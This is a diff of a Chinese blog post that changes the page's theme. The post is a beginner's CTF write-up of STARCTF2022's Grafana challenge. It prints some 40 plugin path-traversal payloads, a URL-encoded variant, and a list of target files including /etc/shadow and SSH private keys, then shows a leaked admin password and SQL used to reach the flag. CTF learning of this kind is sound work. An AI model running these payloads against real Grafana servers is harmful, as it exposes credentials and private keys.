@@ -1,352 +1,138 @@
-
 <!DOCTYPE html>
-<html lang="ch">
-    
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="ttycp3">
-    <title>STARCTF2022-Web - ttycp3</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.0">
+
+  
+
+  
+
+  
     <meta name="author" content="tty">
-    
-    
-    
-        
-            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
-        
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tty","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"oh-my-grafana​      这也算是我第一个在正规比赛里写出来的web题了，激动的心情溢于言表，通过写这个题我也学到了很多新知识，当然也少不了队友的帮助，以后还要更加努力~~~\n​     根据题目知道这是一道grafana框架题，身为萌新做题之前根本就没听说过，百度查看了一下官方的文档介绍grafana官方文档（好了压根看不进去），默认用户名和密码都是admin，我想怎么可能那么轻易让你登录上去，试了一下果然不对。又去搜grafana存在的漏洞点，果然让我找到了，grafana存在任意文件读取漏洞，原理就不细说了，就是利用grafana已经安装的插件来构造payload：\n12345678910111213141516171819202122232425262728293031323334353637383940/public/plugins/alertlist/../../../../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../../../../etc/passwd/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../../../../etc/passwd/public/plugins/cloudwatch/../../../../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../../../../etc/passwd/public/plugins/elasticsearch/../../../../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../../../../etc/passwd/public/plugins/stackdriver/../../../../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../../../../etc/passwd/public/plugins/graphite/../../../../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../../../../etc/passwd/public/plugins/influxdb/../../../../../../../../../../../etc/passwd/public/plugins/jaeger/../../../../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../../../../etc/passwd/public/plugins/loki/../../../../../../../../../../../etc/passwd/public/plugins/mssql/../../../../../../../../../../../etc/passwd/public/plugins/mysql/../../../../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../../../../etc/passwd/public/plugins/opentsdb/../../../../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../../../../etc/passwd/public/plugins/postgres/../../../../../../../../../../../etc/passwd/public/plugins/prometheus/../../../../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../../../../etc/passwd/public/plugins/tempo/../../../../../../../../../../../etc/passwd/public/plugins/testdata/../../../../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../../../../etc/passwd/public/plugins/zipkin/../../../../../../../../../../../etc/passwd\n\n   刚开始一看这不就直接用？然后我就试了好几个poc，总也没反应，burpsuite上跑也是这样，瞬间整个人都不好了就想放弃。好在我有个好队友，原来这个斜杠线需要url编码一下，于是poc为\n1/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd\n\n发现回显\n\n到这又卡住了，去哪个文件找密码呢？没办法只好继续查资料，发现能够读取到的文件有\n12345678910111213/conf/defaults.ini/etc/grafana/grafana.ini/etc/passwd/etc/shadow/home/grafana/.bash_history/home/grafana/.ssh/id_rsa/root/.bash_history/root/.ssh/id_rsa/usr/local/etc/grafana/grafana.ini/var/lib/grafana/grafana.db/proc/net/fib_trie/proc/net/tcp/proc/self/cmdline\n\n  没办法，一个个试看哪个有用。在这里用\n1/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/grafana/grafana.ini\n\n里面能够找到密码，不过我要特别提一下\n1/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../var/lib/grafana/grafana.db\n\n这个能够获得一个数据库文件，在kali虚拟机中打开能够看到用户名和加密后的密码\n\n我一度天真地以为是base64编码的，知道我看着解码后的一串乱码开始怀疑人生，百度确认了一下雀氏不是人能解密出来真正的密码后只能换别的看了。\n​       回到开始，在grafana.ini文件中我们获得了密码，成功进入了grafana内部（这里说得轻巧，光为了找这个密码就花费了我一下午的时间，曾经我离密码只有一步之遥，然后我对着一长串的密码错认为它是加密后的，搞得我还以为这个密码是跟db文件里的密码一样是难以解密的）\n123456789101112131415#################################### Security ####################################[security]# disable creation of admin user on first start of grafana;disable_initial_admin_creation = false# default admin user, created on startupadmin_user = admin# default admin password, can be changed before first start of grafana,  or in profile settingsadmin_password = 5f989714e132c9b04d4807dafeb10ade# used for signing;secret_key = SW2YcwTIb9zpOOhoPsMm...\n\n进入到grafana后我又迷茫了，这要我去哪找flag啊？在学长的提点下，我知道了原来需要通过连接数据库来获取flag，\n\n配置数据源，选mysql（别的好像也行），在探索里输入sql查询命令：\n123show databases;show tables;select * from fffffllllllllaaaaaaaggggg;\n\n然后就获得flag了。耗时13个小时，继续努力。\n","dateCreated":"2022-04-16T23:53:26+08:00","dateModified":"2022-04-30T21:49:23+08:00","datePublished":"2022-04-16T23:53:26+08:00","description":"","headline":"STARCTF2022-Web","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"},"publisher":{"@type":"Organization","name":"tty","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://example.com/2022/04/16/2022-04-16-CTF2022-Web/","keywords":"Writeup"}</script>
-    <meta name="description" content="oh-my-grafana​      这也算是我第一个在正规比赛里写出来的web题了，激动的心情溢于言表，通过写这个题我也学到了很多新知识，当然也少不了队友的帮助，以后还要更加努力~~~ ​     根据题目知道这是一道grafana框架题，身为萌新做题之前根本就没听说过，百度查看了一下官方的文档介绍grafana官方文档（好了压根看不进去），默认用户名和密码都是admin，我想怎么可能那么轻易">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="STARCTF2022-Web">
-<meta property="og:url" content="http://example.com/2022/04/16/2022-04-16-CTF2022-Web/index.html">
-<meta property="og:site_name" content="ttycp3">
-<meta property="og:description" content="oh-my-grafana​      这也算是我第一个在正规比赛里写出来的web题了，激动的心情溢于言表，通过写这个题我也学到了很多新知识，当然也少不了队友的帮助，以后还要更加努力~~~ ​     根据题目知道这是一道grafana框架题，身为萌新做题之前根本就没听说过，百度查看了一下官方的文档介绍grafana官方文档（好了压根看不进去），默认用户名和密码都是admin，我想怎么可能那么轻易">
-<meta property="og:locale">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20220417001156001.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20220417002459033.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20220417004012076.png">
-<meta property="article:published_time" content="2022-04-16T15:53:26.000Z">
-<meta property="article:modified_time" content="2022-04-30T13:49:23.096Z">
-<meta property="article:author" content="tty">
-<meta property="article:tag" content="Writeup">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20220417001156001.png">
-    
-    
-        
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    
-<link rel="stylesheet" href="/assets/css/style-puo4qzcelj2raq27tqrcywohxgqvpmtlretjjx6lnoxbdn5vw0nvfxrzhoyw.min.css">
+  
 
-    <!--STYLES END-->
-    
+  
 
-    
+  
 
-    
-        
-    
+  <title>STARCTF2022-Web | ttycp3</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="alternate" href="/atom.xml" title="ttycp3" type="application/atom+xml">
 </head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
-
+<body>
+  <div class="root-container">
     
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/preview.jpg)"></div>
+  
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/"
-            aria-label=""
-        >
-            ttycp3
-        </a>
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          ttycp3
+        
+      </a>
     </div>
-    
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
         
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="Öffne den Link: /#about"
-            >
+          <li class="navbar-list-item"><a href="/">首页</a></li>
         
+          <li class="navbar-list-item"><a href="/playlist/1.html">歌单</a></li>
         
-        </a>
-    
-</header>
-
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
+          <li class="navbar-list-item"><a href="/projects/cyb.html">工具</a></li>
         
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="Home"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Home</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="Kategorien"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Kategorien</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="Tags"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Tags</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="Archiv"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Archiv</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="Suche"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Suche</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="Über"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Über</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="E-Mail"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">E-Mail</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
+      </ul>
     </div>
+  </div>
 </nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
-                
-<article class="post">
-    
-    
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            STARCTF2022-Web
-        </h1>
-    
-    
-        <div class="post-meta">
-    <time datetime="2022-04-16T23:53:26+08:00">
-	
-		    16 Apr 2022
-    	
-    </time>
-    
-</div>
+  
+  
 
-    
-</div>
+  
+  
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
-            <h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><p>​      这也算是我第一个在正规比赛里写出来的web题了，激动的心情溢于言表，通过写这个题我也学到了很多新知识，当然也少不了队友的帮助，以后还要更加努力~~~</p>
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">STARCTF2022-Web</h1>
+          <h2 class="title-sub-wrap">
+            <strong>tty</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-04-16T15:53:26.000Z" itemprop="datePublished">2022-04-16</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/Writeup/">🏷️ Writeup</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><p>​      这也算是我第一个在正规比赛里写出来的web题了，激动的心情溢于言表，通过写这个题我也学到了很多新知识，当然也少不了队友的帮助，以后还要更加努力~~~</p>
 <p>​     根据题目知道这是一道grafana框架题，身为萌新做题之前根本就没听说过，百度查看了一下官方的文档介绍<a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/latest/?utm_source=grafana_footer">grafana官方文档</a>（好了压根看不进去），默认用户名和密码都是admin，我想怎么可能那么轻易让你登录上去，试了一下果然不对。又去搜grafana存在的漏洞点，果然让我找到了，grafana存在任意文件读取漏洞，原理就不细说了，就是利用grafana已经安装的插件来构造payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stackdriver/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
@@ -377,324 +163,235 @@
 
 <p>然后就获得flag了。耗时13个小时，继续努力。</p>
 
-            
+      </section>
 
-
-        </div>
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/05/13/Webshell%E7%AC%94%E8%AE%B0/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Webshell笔记</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
     </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
-        
-            <div class="post-footer-tags">
-                <span class="text-color-light text-small">GETAGGT IN</span><br/>
-                
-    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeup/" rel="tag">Writeup</a>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">SSRF笔记</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-            </div>
+      <section class="page-message-container layout-padding">
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2022/05/13/Webshell%E7%AC%94%E8%AE%B0/"
-                    data-tooltip="Webshell笔记"
-                    aria-label="FRÜHER: Webshell笔记"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/"
-                    data-tooltip="SSRF笔记"
-                    aria-label="NÄCHSTER: SSRF笔记"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Facebook"
-                    aria-label="Teilen auf Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Twitter"
-                    aria-label="Teilen auf Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Google Plus"
-                    aria-label="Teilen auf Google Plus"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
+
+
+  
+  
+    <div class="valine-container comments-container content-padding--primary soft-size--large soft-style--box">
+      <div id="valine_thread" class="valine-thread"></div>
+    </div>
+    <script type="text/javascript" src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script type="text/javascript" src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <script type="text/javascript">
+      new Valine({
+        el: "#valine_thread",
+        appId: "wuMxbnApLLBmk4DIIs2AEALQ-gzGzoHsz",
+        appKey: "SStvunV3BC8FFQNQ6if5tAUc",
+        avatar: "mm",
+        placeholder: "随便说点什么叭～",
+        notify: true,
+        visitor: true,
+        pageSize: 10,
+      });
+    </script>
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1649147966952106/41945c5bb4d50285490e040625ce5e60df9a8ad6.jpg" class="soft-size--round soft-style--box" alt="ttycp3">
+    
+    
+      <h2>ttycp3</h2>
+    
+    
+      <p>Only the strong survive</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>6</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
